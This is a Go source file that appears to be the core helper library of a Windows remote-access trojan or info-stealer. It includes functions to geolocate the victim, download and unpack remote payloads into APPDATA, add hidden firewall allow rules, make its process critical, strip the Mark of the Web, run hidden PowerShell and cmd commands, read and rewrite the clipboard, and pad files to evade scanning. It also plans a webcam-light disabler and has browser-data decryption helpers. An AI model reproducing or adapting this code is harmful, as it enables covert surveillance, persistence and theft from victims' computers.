package core

import (
	"archive/zip"
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/StackExchange/wmi"
	"golang.org/x/sys/windows"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unicode"
	"unicode/utf16"
	"unsafe"
)

//TODO:
// - Figure out backup method for GeoIP
// - Write Webcam Light Disable Function

func GEOIP() (bool, string, string, string, string, string) {
	res, err := http.Get("http://ip-api.com/json/")
	if err != nil {
		return false, "", "", "", "", ""
	}
	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return false, "", "", "", "", ""
	}
	res.Body.Close()
	dec := json.NewDecoder(strings.NewReader(string(data)))
	var values IPApi
	err = dec.Decode(&values)
	if err != nil {
		return false, "", "", "", "", ""
	}
	return true, values.Country, values.Region, values.City, values.ISP, values.ORG
}

func CreateMutex(name string) (uintptr, error) {
	ret, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(name))))
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}

func DisableWebcamLight(mode bool) bool {
	if mode == true { //Turn Off
		//SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F} "" 8 [0-9]{4}
		//SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318} LedMode 1 [0-9]{4}
	} else { //Turn On
		//SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F} "" 0 [0-9]{4}
		//SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318} LedMode 0 [0-9]{4}
	}
	return true
}

func DownloadAndUnZip(fileURL string) bool {
	n := RandomString(15)
	output, err := os.Create(os.Getenv("APPDATA") + "\\" + n + ".zip")
	if err != nil {
		return false
	}
	defer output.Close()
	response, err := http.Get(fileURL)
	if err != nil {
		return false
	}
	defer response.Body.Close()
	_, err = io.Copy(output, response.Body)
	if err != nil {
		return false
	}
	err = Unzip(os.Getenv("APPDATA")+"\\"+n+".zip", os.Getenv("APPDATA")+"\\"+n+"\\")
	if err != nil {
		return false
	}
	return true
}

func CheckSingleInstance(name string) bool {
	_, err := CreateMutex(name)
	if err != nil {
		return true
	} else {
		return false
	}
}

func RandomString(length int) string {
	chars := []rune("QAZWSXXEDCRFVTGBYHNUJMIKOLP" + "qazwsxedcrfvtgbyhnujmikolp" + "0123456789")
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	return b.String()
}

func AlarmClock(x int) {
	var alarmTime = time.Duration(x) * time.Minute
	Ring := time.NewTicker(alarmTime)
	select {
	case <-Ring.C:
		ClientSleeping = false
	}
}

func KeepAlive() {
	var pulseTime = 10 * time.Second
	pulse := time.NewTicker(pulseTime)
	for {
		select {
		case <-pulse.C:
			procSetThreadExecutionState.Call(uintptr(EsSystemRequired))
		}
	}
}

func BytePump(file string, size int) {
	var wantedSize = int64(size * 1024 * 1024) //Makes a MB
	fi, _ := os.Stat(file)
	toPump, _ := os.OpenFile(file, os.O_RDWR, 0644)
	defer toPump.Close()
	_, _ = toPump.WriteAt([]byte{0}, fi.Size()+wantedSize)
}

func AddToFirewall(name string, file string) bool {
	if AdminState {
		cmd := fmt.Sprintf(`netsh advfirewall firewall add rule name="%s" dir=in action=allow program="%s" enable=yes`, name, file)
		CommandWork := exec.Command("cmd", "/C", cmd)
		CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		History, _ := CommandWork.Output()
		fmt.Println(string(History))
		if strings.Contains(string(History), "Ok.") {
			return true
		}
		return false
	}
	return false
}

func SetCritical(state bool, handle uintptr) {
	if state { //Turn On
		SetInformationProcess(handle, 29, 1, 4) //set processInformation to 0 to disable
	} else { //Turn Off
		SetInformationProcess(handle, 29, 0, 4) //Make process non-Critical
	}
}

func SetInformationProcess(hProcess uintptr, processInformationClass int, processInformation int, processInformationLength int) {
	_, _, _ = procNtSetInformationProcess.Call(hProcess, uintptr(processInformationClass), uintptr(processInformation), uintptr(processInformationLength))
}

func RemoveZoneIdentifier(file string) bool {
	err := os.Remove(file + ":Zone.Identifier")
	if err != nil {
		return false
	}
	return true
}

func IsHidden(filename string) (bool, error) {
	pointer, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return false, err
	}
	attributes, err := syscall.GetFileAttributes(pointer)
	if err != nil {
		return false, err
	}
	return attributes&syscall.FILE_ATTRIBUTE_HIDDEN != 0, nil
}

func StripSpaces(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}

func IssuePowershell(input string) string {
	Info := exec.Command("powershell", "", input)
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, err := Info.Output()
	if err != nil {
		return "Error Running Command"
	}
	return string(History)
}

func MessageBox(title, text string, style uintptr) (result int) {
	ret, _, _ := procMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(title))),
		style)
	result = int(ret)
	return
}

func Run(cmd string) {
	_ = exec.Command("cmd", "/U /C", cmd).Run()
}

func GetForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func GetWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func randInt(min int, max int) int {
	return rand.Intn(max-min) + min
}

func GetChildHandle(hWnd syscall.Handle) syscall.Handle {
	var hndl syscall.Handle
	cb := syscall.NewCallback(func(h syscall.Handle, p uintptr) uintptr {
		hndl = h
		return 0
	})
	EnumChildWindows(hWnd, cb, 0)
	return hndl
}

func CloseHandle(hObject syscall.Handle) bool {
	ret, _, _ := syscall.Syscall(procCloseHandle.Addr(), 1,
		uintptr(hObject),
		0,
		0)
	return ret != 0
}

func EnumChildWindows(hWndParent syscall.Handle, lpEnumFunc, lParam uintptr) bool {
	ret, _, _ := syscall.Syscall(procEnumChildWindows.Addr(), 3,
		uintptr(hWndParent),
		lpEnumFunc,
		lParam)
	return ret != 0
}

func ShowWindow(hWnd syscall.Handle, nCmdShow int32) bool {
	ret, _, _ := syscall.Syscall(procShowWindow.Addr(), 2,
		uintptr(hWnd),
		uintptr(nCmdShow),
		0)
	return ret != 0
}

func FindWindow(title string) syscall.Handle {
	var hwnd syscall.Handle
	cb := syscall.NewCallback(func(h syscall.Handle, p uintptr) uintptr {
		b := make([]uint16, 200)
		_, err := GetWindowText(h, &b[0], int32(len(b)))
		if err != nil {
			return 1
		}
		if strings.Contains(syscall.UTF16ToString(b), title) {
			hwnd = h
			return 0
		}
		return 1
	})
	_ = EnumWindows(cb, 0)
	if hwnd == 0 {
		return 0
	}
	return hwnd
}

func EnumWindows(enumFunc uintptr, lparam uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(procEnumWindows.Addr(), 2, enumFunc, lparam, 0)
	if r1 == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func CalculateChecksum(Length int) string {
	for {
		var Checksum string = ""
		var RandString string = ""
		for len(RandString) < Length {
			Temp := rand.Intn(4)
			if Temp == 1 {
				RandString += string(48 + rand.Intn(57-48))
			} else if Temp == 1 {
				RandString += string(65 + rand.Intn(90-65))
			} else if Temp == 3 {
				RandString += string(97 + rand.Intn(122-97))
			}
			Checksum = RandString
		}
		var Temp2 int = 0
		for i := 0; i < len(Checksum); i++ {
			Temp2 += int(Checksum[i])
		}
		if (Temp2 % 0x100) == 92 {
			return Checksum
		}
	}
}

//TODO:
// - Remove need for WMI import

func CheckForProcess(proc string) bool {
	var dst []Win32Process
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		return false
	}
	for _, v := range dst {
		if bytes.Contains([]byte(v.Name), []byte(proc)) {
			return true
		}
	}
	return false
}

func CheckIfFileExists(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func CreateDirectory(dirPath string, fileMode os.FileMode) bool {
	err := os.MkdirAll(dirPath, fileMode)
	if err != nil {
		return false
	}
	return true
}

func CreateFileAndWriteData(fileName string, writeData []byte) error {
	fileHandle, err := os.Create(fileName)
	if err != nil {
		return err
	}
	writer := bufio.NewWriter(fileHandle)
	defer fileHandle.Close()
	writer.Write(writeData)
	writer.Flush()
	return nil
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()
	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()
	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}
	err = destFile.Sync()
	if err != nil {
		return err
	}
	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}
	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}
	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func waitOpenClipboard() error {
	started := time.Now()
	limit := started.Add(time.Second)
	var r uintptr
	var err error
	for time.Now().Before(limit) {
		r, _, err = procOpenClipboard.Call(0)
		if r != 0 {
			return nil
		}
		time.Sleep(time.Millisecond)
	}
	return err
}

func ReadClipboard() (string, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	if formatAvailable, _, err := procIsClipboardFormatAvailable.Call(cfUnicodetext); formatAvailable == 0 {
		return "", err
	}
	err := waitOpenClipboard()
	if err != nil {
		return "", err
	}
	h, _, err := procGetClipboardData.Call(cfUnicodetext)
	if h == 0 {
		_, _, _ = procCloseClipboard.Call()
		return "", err
	}
	l, _, err := procGlobalLock.Call(h)
	if l == 0 {
		_, _, _ = procCloseClipboard.Call()
		return "", err
	}
	text := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(l))[:])
	r, _, err := procGlobalUnlock.Call(h)
	if r == 0 {
		_, _, _ = procCloseClipboard.Call()
		return "", err
	}
	closed, _, err := procCloseClipboard.Call()
	if closed == 0 {
		return "", err
	}
	return text, nil
}

func WriteClipboard(text string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err := waitOpenClipboard()
	if err != nil {
		return err
	}
	r, _, err := procEmptyClipboard.Call(0)
	if r == 0 {
		_, _, _ = procCloseClipboard.Call()
		return err
	}
	data, _ := windows.UTF16FromString(text)
	h, _, err := procGlobalAlloc.Call(gmemMoveable, uintptr(len(data)*int(unsafe.Sizeof(data[0]))))
	if h == 0 {
		_, _, _ = procCloseClipboard.Call()
		return err
	}
	defer func() {
		if h != 0 {
			procGlobalFree.Call(h)
		}
	}()
	l, _, err := procGlobalLock.Call(h)
	if l == 0 {
		_, _, _ = procCloseClipboard.Call()
		return err
	}
	r, _, err = proclstrcpyW.Call(l, uintptr(unsafe.Pointer(&data[0])))
	if r == 0 {
		_, _, _ = procCloseClipboard.Call()
		return err
	}
	r, _, err = procGlobalUnlock.Call(h)
	if r == 0 {
		if err.(syscall.Errno) != 0 {
			_, _, _ = procCloseClipboard.Call()
			return err
		}
	}
	r, _, err = procSetClipboardData.Call(cfUnicodetext, h)
	if r == 0 {
		_, _, _ = procCloseClipboard.Call()
		return err
	}
	h = 0
	closed, _, err := procCloseClipboard.Call()
	if closed == 0 {
		return err
	}
	return nil
}

func CompressZIP(Compress, Save string) error {
	files, _ := ioutil.ReadDir(Compress)
	var b = new(bytes.Buffer)
	zw := zip.NewWriter(b)
	for _, f := range files {
		fw, _ := zw.Create(f.Name())
		fileName := path.Join(Compress, f.Name())
		fileContent, err := ioutil.ReadFile(fileName)
		if err != nil {
			_ = zw.Close()
			return err
		}
		_, err = fw.Write(fileContent)
		if err != nil {
			_ = zw.Close()
			return err
		}
	}
	if err := zw.Close(); err != nil {
		return err
	}
	zipName := Save
	outFile, _ := os.Create(zipName)
	_, err := b.WriteTo(outFile)
	if err != nil {
		return err
	}
	_ = outFile.Close()
	_ = zw.Close()
	return nil
}

func Unzip(src, dest string) error {
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer func() {
		if err := r.Close(); err != nil {
			panic(err)
		}
	}()
	_ = os.MkdirAll(dest, 0755)
	extractAndWriteFile := func(f *zip.File) error {
		rc, err := f.Open()
		if err != nil {
			return err
		}
		defer func() {
			if err := rc.Close(); err != nil {
				panic(err)
			}
		}()
		path := filepath.Join(dest, f.Name)
		if !strings.HasPrefix(path, filepath.Clean(dest)+string(os.PathSeparator)) {
			return fmt.Errorf("illegal file path: %s", path)
		}
		if f.FileInfo().IsDir() {
			_ = os.MkdirAll(path, f.Mode())
		} else {
			_ = os.MkdirAll(filepath.Dir(path), f.Mode())
			f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return err
			}
			defer func() {
				if err := f.Close(); err != nil {
					panic(err)
				}
			}()
			_, err = io.Copy(f, rc)
			if err != nil {
				return err
			}
		}
		return nil
	}
	for _, f := range r.File {
		err := extractAndWriteFile(f)
		if err != nil {
			return err
		}
	}
	return nil
}

func IntToBool(a int) bool {
	switch a {
	case 0, -1:
		return false
	}
	return true
}

func BookMarkType(a int64) string {
	switch a {
	case 1:
		return "url"
	default:
		return "folder"
	}
}

func TimeStampFormat(stamp int64) time.Time {
	s1 := time.Unix(stamp, 0)
	if s1.Local().Year() > 9999 {
		return time.Date(9999, 12, 13, 23, 59, 59, 0, time.Local)
	}
	return s1
}

func TimeEpochFormat(epoch int64) time.Time {
	maxTime := int64(99633311740000000)
	if epoch > maxTime {
		return time.Date(2049, 1, 1, 1, 1, 1, 1, time.Local)
	}
	t := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	d := time.Duration(epoch)
	for i := 0; i < 1000; i++ {
		t = t.Add(d)
	}
	return t
}

func ReadFile(filename string) (string, error) {
	s, err := ioutil.ReadFile(filename)
	return string(s), err
}

func FormatFileName(dir, browser, filename, format string) string {
	r := strings.Replace(strings.TrimSpace(strings.ToLower(browser)), " ", "_", -1)
	p := path.Join(dir, fmt.Sprintf("%s_%s.%s", r, filename, format))
	return p
}

func MakeDir(dirName string) error {
	if _, err := os.Stat(dirName); os.IsNotExist(err) {
		return os.Mkdir(dirName, 0700)
	}
	return nil
}

func extractString(p uintptr) string {
	if p == 0 {
		return ""
	}
	out := make([]uint16, 0, 64)
	for i := 0; ; i += 2 {
		c := *((*uint16)(unsafe.Pointer(p + uintptr(i))))
		if c == 0 {
			break
		}
		out = append(out, c)
	}
	return string(utf16.Decode(out))
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func extractBytes(p uintptr, len uintptr) []byte {
	if p == 0 {
		return []byte{}
	}
	out := make([]byte, len)
	for i := range out {
		out[i] = *((*byte)(unsafe.Pointer(p + uintptr(i))))
	}
	return out
}
